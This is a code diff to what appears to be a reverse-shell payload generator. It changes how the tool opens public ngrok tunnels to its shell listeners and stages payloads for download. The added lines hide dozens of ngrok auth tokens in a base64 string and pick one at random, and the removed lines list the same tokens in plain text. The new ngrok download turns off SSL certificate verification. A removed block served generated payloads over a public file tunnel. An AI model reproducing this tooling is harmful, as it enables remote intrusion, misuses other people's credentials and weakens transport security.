@@ -13,7 +13,8 @@ __Release_Notes__ = '''
  + Code optimization
 
 🐛 Bug fixes
- + Fix a bug (about packaged binaries ngrok repeated download)
+ + Fix ngrok repeated download problem
+ + Fix ngrok download ssl error
 
 '''
 
@@ -47,9 +48,16 @@ try:
     import os
     import random
     import re
+    import socket
+    import ssl
     import string
     import sys
+    import threading
     from argparse import ArgumentParser
+    from time import sleep
+
+    import requests
+    from pyngrok import ngrok, conf, installer
 
     # Get file execution path
     if getattr(sys, 'frozen', False):
@@ -316,19 +324,41 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
     if port and not port2:
         try:
             port2 = int(port) + 1
-        except TypeError:
+        except (TypeError, ValueError):
             pass
 
     conn_info = str(host) + ":" + str(port)
     if localtunnel:
-        loc = localtunnel[6:]
-        name = "ngrok-tcp-" + loc
+        tokens = "MXBxTlBvbWdkOElTNE1FVkQ1aXhXcWJ5bmNpXzdxUFVWOFBROWJaaERoUjIzZ3ZCcSwxcWtNTWR1Qk96REVFWmdidlRWVW1pRjdCODhfMmNuVGU4R041WTVOS0VuZjN2OTZ2LDFxa01UdG9yUkp0UURqS2FESGdEQmhWcXhNMF81TVJnekdaWVdzajNlcmtFb2ZOelAsMXFrTWFTamtmbWdueTR0ZE5HaHc4Q0VsdFdMX3hOb0t0ZG53TnlnaGlGUGdnUFBLLDFxa01pUXBqM2RQODN3c2xUSXJwVmVGUGMyUF8ySmVkdnRQWlA5dGdFTDhUUlVaWTcsMXF5OGw1Q0xsT1JlVDZ0ZERRaUx4anlQOTB0XzVBMk1jMWFEYU1yUmtnckpQcmtyMSwxcXk4ejlvY3Z1cFU0dHZVa0U1a3FrcWNzWlZfODVKNk1QVEdjUzRSZ2dkaXMxcGNwLDFxeTk0ZEJjdndkMzc0ZGdQMTkzUGdJQ0pTQV9QS2VKTk1lTlZOcE5jVUI3YkY1aCwxcXk5R0dTRVBjZVNhdWFtb1Nra05oMzNydDZfNHd1VWV3NDRBOUFVQTExc21ZQTczLDFxeTlMRW5OSWc4ZmxIVENLVHhsUWE4V1RoOF81YkFpVnFTOEhSamRlMndKRnJxQnYsMXF5OWI1RTNsdW02UE5IZG0xUXVscjZGRDJrXzVoaU1VYzRKRlh3WnFROWlrTmE0RCwxcXk5ZmJrcjZzWERzZXptTnU0Y2ZPUHhGN0VfNGdlU2NGSENBZUJNc1BEM2hreVBtLDFxeTlVV3o3TjViSDdDYTdXOHRzZEtNVVRpUF8zTXYzSHhRZFh0YUVqYjd3cnJjMlosNVMyOHJCS2djMjJaVzdldnllZE5UX1l2RW0xNVJaU0hkWGdTNFF3WWJrLDlBWjdSSnVMRFVBcVR6OFhMWkU1XzZ0czVrVFdDdnZFNW81QmRUNWp5RSw0NkJVR0Q0WGhVUFRhSHE3WEpCd3ZfN2UxUFpVbjVRbTZaMjczNWk2NFVOLDFocGYzOVlYMnFDWHFBa01NY1JMQzBMNHd3OV8yVldnMUNkSFhHamNnbm9KSDJxRWYsMVVxSHNTaGk2bzNrZXRmNDI2UDVVdFZkVGZzXzVYRkQ2c0ZSTWtyeWthOGZBYkxkMyxMc1ZaRnhGcWd4QTRoN2liV1Y5Vl9pdUE5YWZiUXdhU25HcUg5ZEFwTCwxaHZSZjBMdnd1QUkwU29DZkI1SjBDbnowMmNfcVk4UGZrNUhSa3hxZ1o4VUZIZGcsNHJZdXZBVHl3MTlDbWszeXV4SkRlXzRTc3NOVEViMjdFRTFVNGVzMTdwSiwxUHhaNUVxRUJtUFlZeFU3bGJVWUNSTmRKbGdfNURld1lkMnNWQVNvOFpka21Bam9VLDFQQ2pUbFZGdGVoYlAwR1c4MkNIZlhIcXBzOF9RbXJlRE5XRFVUd3RIMlVjRDc1ayw3dUczd1pqdnZTWFpZTVczNkxZZTNfNGhSYzZuYnpieTdhUjQyRk1adXVVLDFoZEZKbVFDNmlJYWsxZVNicXgxdDdScng1Nl8ySkxwYXNEVkh5YkJpeFd2N1hmdG0sM0YzZUxRUlZzVUc1Z3FWUFRORDNBXzJ2WFh0UENqSzNUbm5FYXp4SEU3YSw1aW9IcDNRcjF6dHNNejlhZFhUSDdfNUdGNllUcEVuY3pWcmpHdm15ZDZSLDFnWU5HQ3cxWlJnelJUTWNrZWpaSjY4ZmJPZV8zZEZaSmZMdUE4dFRzZUxDbWpZV0ssM0dQbWZWOGVWd0c3WTQ5VDQ5ajJGXzVhYXpqazQ4b3dxS0E5SkpaTnM0ZixLdVRLUm9zcmF3ckRNQWdYMWF5cV83QUFtc1ZTb200RTZHdFQxOFMxcG4sMVdSS3Y2cHdqWjBwYmpTRnBtRFZyQjN0aDJkXzcybzZxVlpSUkpOSGU0VUJuTFJETSwxaVZGTmNlaU9ZczZQUDBWQUlKZ2RrdGV0aW9fNXFXeGl4M2RMTHNkRktwdEdzUXM1LDFYN2FZV1B1RktZenZld0xibk5vTW83MWtaaV8ydXpiQjk2NlE0VFU1Y3BnTlBLaHksN0xFMThMSzh6ZWFEWWV5YnA1ZktQXzZHTkcxb0hFZmhUblFFN3M5cXB3LDFRZTFJZXlTT1FXU1RucFEzZUZmcjhqN09pNV8yemhhbnFucFp3SEJoc2ZBTmQ2eWYsMVhKTk5uRzhrWnNQampGbUxzWU5XQ0MwZ0lvXzdWcEJod1RjdmhpdUs0bzJHMmpidCwxWHpQNzBrN1lWcmc3TU1hSFFXUGtzMFE4WmFfN3k2YjFtVERKRG1KV2N1cXQ1cVRwLDFZMTRHQjdFNGFjWHhXWW5WVGlCZWpnbkx1Vl84NTN6N21BZ2FUSnhFOUtZM0huQ1csMVhrb0tOTGN5aVBFQ2NRZkdVanJUVnpONjRQXzd0djJZZ0M0RFNuYXp5VnRwQ3BIbSwxWGM3ejB1SHhEb0k5QWgwNkVRS2dINjF6b1BfNldUUFhER3ZqRm1jcDJvN2dObXFhLDFxa01xNHA2NDRxWGNXVndXaVl2NlM2NGxuMl91NjRYRGVLWjlpUWRMQTVVakh4OCwxcWtNd2dCNXdJc2oyOXozZEtueEZwTW1yVnJfM2N2eWNoWG8zRm9mWDNYTmVWMTRHLDNjNFdaYXhQYmplUndSaWJZNW9wVV8yTjRUVFJLYUR1YnRFV01lS2tGWG4sM2ZXNGVYSGRVTjN6aUNCWGNhaFpfM3RuRGRhVHlMdzh0S3pKdEtaa0xwLDNDcWVGWlFodDQzY0c1WjJZS2Z5dl82YUtUcmdyYm8xSHR5Umk3OGhSS0ssMVJDUXdjdFZqU3o4QUl6SE82UzU1am04WEI4XzVONlBxeVpWbm9ON21VVnFGMXl2VCwzWThZU3c2YnZDOUNzYlllUmN6bXRfOGFrTXVMWUEzYkFVc2hQMU5DTW5XLDFYU1lxOGdteHpOZ01sWVF6RVJtQzUwdUJvdF82cVVSWm5qNDNLc1lGMkdXYVVhbW0sN1ZKd0drQ1RUVXViaUdoZ3o2R3Y2XzVmTUxnYW5SU0tqOW50ZGVmbkY1bywzVm5yclhEUVZIb05wOUh2SEZocVhfM1g0SkV4d202TDluNnc0cHBMMXF5LDFTaHNoTndmaFFjeU9xbE1qbkJEVkU1WDVqQ18zV0Ftem9tTUhBZ2t1bmthNGRTY2ssNzcyeUZBdWk2eW5IOUFZeDI5SEhTXzVYY3I4OHBIdFBUUUx3ZXd2N0N0aywxVDc1MGF0SmkzeGNjbmRlVXFKNGV3aVM2Mm9fMnM2ZjhHVWNjTDFxRFVYVEdTZnROLDFRVXlzUlVvOTd3NW1kQjZzQ1p2VFRNTTBhS18zdW5vTXM2bllkN2dyZ0NrdWhiajMsNWVNeXdaTGlzSk5keWJxcEZMVmdzXzRYUURlRjNZQ01IdTFZYmY3bVZFNiwxU0dzNHM5TnJoeFA5RlJVUnN6akwxbklUU3Zfb3RjcGZwYjZhTVZFTDEzdTNkdjEsMVN1SzJ1a005WjROb2hvSmJVOTIyNHVNelhyXzZoMUFCZENySlUyRXZpWnY0Uk40ciw3ZWNtdDJLdXg1dVlzVFVIcnJxR1VfM1c5Q0puYVNlU3l4aXdranhOaEhjLDJEWFVSanJVaEFaWk5NaHFONW0xRl82SEh6ZWpjZlJlY1A4dXB3Sm5OQmQsMjVuQllZb0poUnU5RlhyQVRsT3FnZlluTmwyXzducUJaZUtlMzdoYkcyZFUxdkFYbg=="
+        if authtoken == "":
+            authtoken = random.choice(b64.b64decode(tokens.encode()).decode().split(','))
+        region = localtunnel[6:]
+        name = "ngrok-tcp-" + region
         public_url = None
         # print([x.name for x in __import__('threading').enumerate()])
-        if name not in [_.name for _ in __import__('threading').enumerate()]:
+        if name not in [_.name for _ in threading.enumerate()]:
             try:
-                t = ThreadWithReturn(target=tunnel, name=name, kwargs={"authtoken": authtoken, "protocol": "tcp",
-                                                                       "port": port, "loc": loc})
+                if not os.path.exists(conf.get_default().ngrok_path):
+                    ngrok_path = os.path.abspath(os.path.join(exec_path, conf.get_ngrok_bin()))
+                else:
+                    ngrok_path = conf.get_default().ngrok_path
+
+                global ngrok_conf
+                ngrok_conf = conf.PyngrokConfig(region=region, auth_token=authtoken, monitor_thread=False,
+                                                ngrok_path=ngrok_path)
+
+                if not os.path.exists(ngrok_path):
+                    ngrok_ssl = ssl.create_default_context()
+                    ngrok_ssl.check_hostname = False
+                    ngrok_ssl.verify_mode = ssl.CERT_NONE
+                    download_status = os.path.join(__import__('tempfile').gettempdir(), str(__import__('time').time())[0:7])
+                    if not os.path.exists(download_status):
+                        with open(download_status, 'w') as f:
+                            f.write('')
+                        installer.install_ngrok(ngrok_conf.ngrok_path, context=ngrok_ssl)
+                        os.remove(download_status)
+
+                t = ThreadWithReturn(target=tunnel, name=name, kwargs={"protocol": "tcp", "port": port})
                 t.daemon = True
                 t.start()
                 public_url = t.join(timeout=60)
@@ -337,10 +367,9 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
         else:
             uri = "http://127.0.0.1:4040/api/tunnels"
             try:
-                from pyngrok import ngrok
                 for _ in range(3):
-                    __import__('time').sleep(1)
-                    public_url = __import__('requests').get(uri, timeout=3).json()["tunnels"][0]["public_url"]
+                    sleep(1)
+                    public_url = requests.get(uri, timeout=3).json()["tunnels"][0]["public_url"]
                     # public_url = ngrok.api_request(uri, method="GET")["tunnels"]["public_url"]
                     if public_url:
                         break
@@ -348,12 +377,12 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                 pass
             finally:
                 if not public_url:
-                    ngrok.kill(pyconf)
+                    ngrok.kill(ngrok_conf)
 
         if public_url:
             try:
                 public_host = public_url.split("tcp://")[1].split(":")[0]
-                host = __import__('socket').gethostbyname(public_host)
+                host = socket.gethostbyname(public_host)
                 public_port = public_url.split("tcp://")[1].split(":")[1]
                 conn_info = host + ":" + public_port + "<==>" + "127.0.0.1:" + str(port)
                 port = public_port
@@ -597,86 +626,15 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
     return title, payloads_dict
 
 
-def tunnel(authtoken="", protocol=None, port=None, _dir=None, loc=None, url=None):
-    ngrok_conf = {
-        "token": ["1pqNPomgd8IS4MEVD5ixWqbynci_7qPUV8PQ9bZhDhR23gvBq",
-                  "1qkMMduBOzDEEZgbvTVUmiF7B88_2cnTe8GN5Y5NKEnf3v96v",
-                  "1qkMTtorRJtQDjKaDHgDBhVqxM0_5MRgzGZYWsj3erkEofNzP",
-                  "1qkMaSjkfmgny4tdNGhw8CEltWL_xNoKtdnwNyghiFPggPPK",
-                  "1qkMiQpj3dP83wslTIrpVeFPc2P_2JedvtPZP9tgEL8TRUZY7",
-                  "1qy8l5CLlOReT6tdDQiLxjyP90t_5A2Mc1aDaMrRkgrJPrkr1",
-                  "1qy8z9ocvupU4tvUkE5kqkqcsZV_85J6MPTGcS4Rggdis1pcp",
-                  "1qy94dBcvwd374dgP193PgICJSA_PKeJNMeNVNpNcUB7bF5h",
-                  "1qy9GGSEPceSauamoSkkNh33rt6_4wuUew44A9AUA11smYA73",
-                  "1qy9LEnNIg8flHTCKTxlQa8WTh8_5bAiVqS8HRjde2wJFrqBv",
-                  "1qy9b5E3lum6PNHdm1Qulr6FD2k_5hiMUc4JFXwZqQ9ikNa4D",
-                  "1qy9fbkr6sXDsezmNu4cfOPxF7E_4geScFHCAeBMsPD3hkyPm",
-                  "1qy9UWz7N5bH7Ca7W8tsdKMUTiP_3Mv3HxQdXtaEjb7wrrc2Z",
-                  "5S28rBKgc22ZW7evyedNT_YvEm15RZSHdXgS4QwYbk",
-                  "9AZ7RJuLDUAqTz8XLZE5_6ts5kTWCvvE5o5BdT5jyE",
-                  "46BUGD4XhUPTaHq7XJBwv_7e1PZUn5Qm6Z2735i64UN",
-                  "1hpf39YX2qCXqAkMMcRLC0L4ww9_2VWg1CdHXGjcgnoJH2qEf",
-                  "1UqHsShi6o3ketf426P5UtVdTfs_5XFD6sFRMkryka8fAbLd3",
-                  "LsVZFxFqgxA4h7ibWV9V_iuA9afbQwaSnGqH9dApL",
-                  "1hvRf0LvwuAI0SoCfB5J0Cnz02c_qY8Pfk5HRkxqgZ8UFHdg",
-                  "4rYuvATyw19Cmk3yuxJDe_4SssNTEb27EE1U4es17pJ",
-                  "1PxZ5EqEBmPYYxU7lbUYCRNdJlg_5DewYd2sVASo8ZdkmAjoU",
-                  "1PCjTlVFtehbP0GW82CHfXHqps8_QmreDNWDUTwtH2UcD75k",
-                  "7uG3wZjvvSXZYMW36LYe3_4hRc6nbzby7aR42FMZuuU",
-                  "1hdFJmQC6iIak1eSbqx1t7Rrx56_2JLpasDVHybBixWv7Xftm",
-                  "3F3eLQRVsUG5gqVPTND3A_2vXXtPCjK3TnnEazxHE7a",
-                  "5ioHp3Qr1ztsMz9adXTH7_5GF6YTpEnczVrjGvmyd6R",
-                  "1gYNGCw1ZRgzRTMckejZJ68fbOe_3dFZJfLuA8tTseLCmjYWK",
-                  "3GPmfV8eVwG7Y49T49j2F_5aazjk48owqKA9JJZNs4f",
-                  "KuTKRosrawrDMAgX1ayq_7AAmsVSom4E6GtT18S1pn",
-                  "1WRKv6pwjZ0pbjSFpmDVrB3th2d_72o6qVZRRJNHe4UBnLRDM",
-                  "1iVFNceiOYs6PP0VAIJgdktetio_5qWxix3dLLsdFKptGsQs5",
-                  "1X7aYWPuFKYzvewLbnNoMo71kZi_2uzbB966Q4TU5cpgNPKhy",
-                  "7LE18LK8zeaDYeybp5fKP_6GNG1oHEfhTnQE7s9qpw",
-                  "1Qe1IeySOQWSTnpQ3eFfr8j7Oi5_2zhanqnpZwHBhsfANd6yf",
-                  "1XJNNnG8kZsPjjFmLsYNWCC0gIo_7VpBhwTcvhiuK4o2G2jbt",
-                  "1XzP70k7YVrg7MMaHQWPks0Q8Za_7y6b1mTDJDmJWcuqt5qTp",
-                  "1Y14GB7E4acXxWYnVTiBejgnLuV_853z7mAgaTJxE9KY3HnCW",
-                  "1XkoKNLcyiPECcQfGUjrTVzN64P_7tv2YgC4DSnazyVtpCpHm",
-                  "1Xc7z0uHxDoI9Ah06EQKgH61zoP_6WTPXDGvjFmcp2o7gNmqa",
-                  "1qkMq4p644qXcWVwWiYv6S64ln2_u64XDeKZ9iQdLA5UjHx8",
-                  "1qkMwgB5wIsj29z3dKnxFpMmrVr_3cvychXo3FofX3XNeV14G",
-                  "3c4WZaxPbjeRwRibY5opU_2N4TTRKaDubtEWMeKkFXn",
-                  "3fW4eXHdUN3ziCBXcahZ_3tnDdaTyLw8tKzJtKZkLp",
-                  "3CqeFZQht43cG5Z2YKfyv_6aKTrgrbo1HtyRi78hRKK",
-                  "1RCQwctVjSz8AIzHO6S55jm8XB8_5N6PqyZVnoN7mUVqF1yvT",
-                  "3Y8YSw6bvC9CsbYeRczmt_8akMuLYA3bAUshP1NCMnW",
-                  "1XSYq8gmxzNgMlYQzERmC50uBot_6qURZnj43KsYF2GWaUamm",
-                  "7VJwGkCTTUubiGhgz6Gv6_5fMLganRSKj9ntdefnF5o",
-                  "3VnrrXDQVHoNp9HvHFhqX_3X4JExwm6L9n6w4ppL1qy",
-                  "1ShshNwfhQcyOqlMjnBDVE5X5jC_3WAmzomMHAgkunka4dSck",
-                  "772yFAui6ynH9AYx29HHS_5Xcr88pHtPTQLwewv7Ctk",
-                  "1T750atJi3xccndeUqJ4ewiS62o_2s6f8GUccL1qDUXTGSftN",
-                  "1QUysRUo97w5mdB6sCZvTTMM0aK_3unoMs6nYd7grgCkuhbj3",
-                  "5eMywZLisJNdybqpFLVgs_4XQDeF3YCMHu1Ybf7mVE6",
-                  "1SGs4s9NrhxP9FRURszjL1nITSv_otcpfpb6aMVEL13u3dv1",
-                  "1SuK2ukM9Z4NohoJbU9224uMzXr_6h1ABdCrJU2EviZv4RN4r",
-                  "7ecmt2Kux5uYsTUHrrqGU_3W9CJnaSeSyxiwkjxNhHc",
-                  "2DXURjrUhAZZNMhqN5m1F_6HHzejcfRecP8upwJnNBd",
-                  "25nBYYoJhRu9FXrATlOqgfYnNl2_7nqBZeKe37hbG2dU1vAXn"],
-        "loc": ["us", "eu", "ap", "au", "sa", "jp", "in"]
-    }
-    if authtoken != "":
-        token = authtoken
-    else:
-        token = random.choice(ngrok_conf["token"])
-    from pyngrok import ngrok, conf
-    ngrok_path = os.path.abspath(os.path.join(exec_path, conf.get_ngrok_bin()))
-    global pyconf
-    pyconf = conf.PyngrokConfig(region=loc, auth_token=token, monitor_thread=False, ngrok_path=ngrok_path)
+def tunnel(protocol=None, port=None, _dir=None, url=None):
     try:
         if protocol == "tcp":
-            tun = ngrok.connect(port, protocol, pyngrok_config=pyconf)
+            tun = ngrok.connect(port, protocol, pyngrok_config=ngrok_conf)
 
         elif protocol == "file":
-            tun = ngrok.connect("file://" + _dir, pyngrok_config=pyconf)
+            tun = ngrok.connect("file://" + _dir, pyngrok_config=ngrok_conf)
 
-        __import__('time').sleep(1)
+        sleep(1)
         try:
             url = tun.public_url
         except AttributeError:
@@ -686,7 +644,7 @@ def tunnel(authtoken="", protocol=None, port=None, _dir=None, loc=None, url=None
         pass
     except Exception as e:
         if "URLError: timed out" or "TimeoutError" in str(e):
-            ngrok.kill(pyconf)
+            ngrok.kill(ngrok_conf)
         else:
             print(e)
         pass
@@ -786,36 +744,6 @@ class PayloadWrapper:
                     else:
                         print("test", payload_url)
                     staged_payload_dict[name] = self.urlWrapper(staging_cmd, payload_url) + "|" + shell_path
-        elif staging_url == "100":
-            public_url = ""
-            web_dir = "./tmp_web/"
-            # print([_.name for _ in threading.enumerate()])
-            try:
-                if "ngrok-file" not in [_.name for _ in __import__('threading').enumerate()]:
-                    t = ThreadWithReturn(target=tunnel, kwargs={"protocol": "file", "_dir": web_dir[1:]},
-                                         name="ngrok-file")
-                    t.daemon = True
-                    t.start()
-                    public_url = t.join(timeout=5)
-            except Exception as e:
-                print(e)
-                pass
-
-            try:
-                if not os.path.isdir(web_dir):
-                    os.mkdir(web_dir)
-                filename = 0
-                for name, payload in payloads_dict.items():
-                    filename += 1
-                    filepath = os.path.abspath(os.path.join(web_dir, str(filename)))
-                    with open(filepath, "wb") as o:
-                        o.write(payload.encode("utf-8"))
-                    staging_url = str(public_url) + '/' + str(filename)
-                    staged_payload_dict[name] = self.urlWrapper(staging_cmd, staging_url) + "|" + shell_path
-            except Exception as e:
-                print(e)
-                pass
-
         else:
             for name, payload_url in payloads_dict.items():
                 staged_payload_dict[name] = self.urlWrapper(staging_cmd, staging_url) + "|" + shell_path
@@ -890,7 +818,7 @@ class PayloadWrapper:
     def request(api=None, method=None, headers=None, data_dict=None):
         url = api
         method = method
-        session = __import__('requests').Session()
+        session = requests.Session()
         payload_url_dict = {}
         for key, data in data_dict.items():
             if method == "put":
@@ -910,7 +838,7 @@ class PayloadWrapper:
     def request2(api=None, method=None, headers=None, payload=None):
         url = api
         method = method
-        session = __import__('requests').Session()
+        session = requests.Session()
         payload_url_dict = {}
         for key, value in payload.items():
             if method == "put":
@@ -928,7 +856,6 @@ class PayloadWrapper:
 
     @staticmethod
     def socket(host=None, port=None, payload=None):
-        import socket
         host = host
         port = int(port)
         reply = b""
@@ -1123,7 +1050,7 @@ class Encoder(object):
 
     @staticmethod
     def url(payload):
-        return str(__import__('requests').utils.quote(payload))
+        return str(requests.utils.quote(payload))
 
 
 class Obfuscator:
@@ -1716,6 +1643,7 @@ def create_app(host="127.0.0.1", port=80, debug=False, template='', authtoken=''
     SERVER_NAME = 'rcX ' + __Version__
     cli = sys.modules['flask.cli']
     cli.show_server_banner = lambda *x: None
+
     if template != 1:
         app = localFlask(__name__, static_folder=os.path.abspath(template), static_url_path="")
         if os.path.isdir(template):
@@ -1855,11 +1783,7 @@ def create_app(host="127.0.0.1", port=80, debug=False, template='', authtoken=''
         if request.host not in ["127.0.0.1", "localhost"]:
             localtunnel = ""
         if localtunnel == "ng_close":
-            try:
-                from pyngrok import ngrok
-                ngrok.kill(pyconf)
-            except (Exception,) as _:
-                print(_)
+            ngrok.kill(ngrok_conf)
 
         if not direction:
             direction = "reverse"
@@ -1939,7 +1863,7 @@ _thread_target_key, _thread_args_key, _thread_kwargs_key = (
 )
 
 
-class ThreadWithReturn(__import__('threading').Thread):
+class ThreadWithReturn(threading.Thread):
     def __init__(self, *args, **kwargs):
         super(ThreadWithReturn, self).__init__(*args, **kwargs)
         self._return = None
@@ -2146,7 +2070,7 @@ def cmdLineParser():
     parser.add_argument("--ip-obf", type=str, metavar='', choices=['ip2int', 'ip2oct', 'ip2hex'],
                         help="Obfuscate IP address.")
     parser.add_argument("--staging-url", metavar='', help="Use staging for shells, Choose number 0-10 or custom url")
-    parser.add_argument("--staging-cmd", metavar='',
+    parser.add_argument("--staging-cmd", metavar='', default='0',
                         help="Staging binary file, Choose number 0-10 or custom. Default:curl")
     parser.add_argument("--password", type=str, default='', metavar='', help="Shell password.")
     parser.add_argument("--protocol", default='tcp',
@@ -2208,10 +2132,9 @@ def main():
 
         if args.tunnel:
             try:
-                from pyngrok import ngrok
-                tun = ngrok.get_tunnels(pyconf)
+                tun = ngrok.get_tunnels(ngrok_conf)
                 print(tun[0], "(Press CTRL+C to quit)")
-                ngp = ngrok.get_ngrok_process(pyconf)
+                ngp = ngrok.get_ngrok_process(ngrok_conf)
                 ngp.proc.wait()
             except IndexError as e:
                 print("ngrok tunnel start failed:", e)
